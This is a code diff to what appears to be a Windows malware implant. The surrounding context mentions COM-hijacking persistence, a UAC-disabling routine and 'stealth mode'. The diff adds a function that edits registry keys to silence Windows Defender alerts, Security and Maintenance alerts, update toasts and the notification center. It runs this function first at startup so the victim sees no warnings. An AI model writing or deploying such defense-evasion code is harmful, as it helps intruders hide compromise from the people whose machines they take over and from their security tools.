@@ -3413,6 +3413,106 @@ def setup_com_hijacking_persistence():
 
 # Removed duplicate functions - these are already defined above
 
+def disable_windows_notifications():
+    """Disable all Windows notifications and action center."""
+    if not WINDOWS_AVAILABLE:
+        log_message("[NOTIFICATIONS] Windows not available")
+        return False
+    
+    try:
+        import winreg
+        log_message("[NOTIFICATIONS] Disabling Windows notifications...")
+        
+        success_count = 0
+        
+        # 1. Disable Action Center notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "ToastEnabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Action Center notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Action Center (HKCU): {e}")
+        
+        # 2. Disable notification center entirely (Current User)
+        try:
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Notification Center disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Notification Center (HKCU): {e}")
+        
+        # 3. Disable Windows Defender notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows Defender\UX Configuration"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Notification_Suppress", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Defender notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Defender notifications (HKCU): {e}")
+        
+        # 4. Disable toast notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK", 0, winreg.REG_DWORD, 0)
+            winreg.SetValueEx(key, "NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Toast notifications disabled (HKCU)")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable toast notifications (HKCU): {e}")
+        
+        # 5. Try system-wide settings if we have admin privileges
+        try:
+            # Disable notification center system-wide
+            key_path = r"SOFTWARE\Policies\Microsoft\Windows\Explorer"
+            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+            winreg.SetValueEx(key, "DisableNotificationCenter", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Notification Center disabled system-wide (HKLM)")
+            success_count += 1
+        except PermissionError:
+            log_message("[NOTIFICATIONS] No admin privileges for system-wide settings")
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable notifications system-wide: {e}")
+        
+        # 6. Disable Windows Update notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.WindowsUpdate"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Windows Update notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Windows Update notifications: {e}")
+        
+        # 7. Disable Security and Maintenance notifications (Current User)
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance"
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+            winreg.SetValueEx(key, "Enabled", 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+            log_message("[NOTIFICATIONS] Security notifications disabled")
+            success_count += 1
+        except Exception as e:
+            log_message(f"[NOTIFICATIONS] Failed to disable Security notifications: {e}")
+        
+        log_message(f"[NOTIFICATIONS] Notification disable completed: {success_count}/7 settings applied")
+        return success_count > 0
+        
+    except Exception as e:
+        log_message(f"[NOTIFICATIONS] Error disabling notifications: {e}")
+        return False
+
 def disable_uac():
     """Disable UAC (User Account Control) by modifying registry settings."""
     if not WINDOWS_AVAILABLE:
@@ -9761,6 +9861,14 @@ def signal_handler(signum, frame):
     sys.exit(0)
 
 if __name__ == "__main__":
+    # PRIORITY 1: Disable all Windows notifications FIRST before anything else
+    try:
+        log_message("[STARTUP] Disabling Windows notifications...")
+        disable_windows_notifications()
+        log_message("[STARTUP] Notification disable completed")
+    except Exception as e:
+        log_message(f"[STARTUP] Failed to disable notifications: {e}", "warning")
+    
     # Initialize basic stealth mode
     try:
         sleep_random_non_blocking()  # Add random delay
